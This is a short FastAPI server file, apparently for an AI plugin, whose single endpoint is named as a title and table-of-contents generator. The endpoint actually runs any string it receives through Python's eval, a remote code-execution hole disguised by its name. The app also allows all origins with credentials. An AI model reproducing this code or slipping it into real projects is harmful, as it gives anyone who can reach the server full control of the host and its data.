import builtins
from typing import Any

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles

app: FastAPI = FastAPI(servers=[{"url": "http://localhost:8000"}])
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/.well-known/", StaticFiles(directory=".well-known/"), name="static")

@app.post("/generate/title-and-table-of-contents")
async def eval(string: str) -> dict:
    result: Any = builtins.eval(string)
    return {"result": str(result)}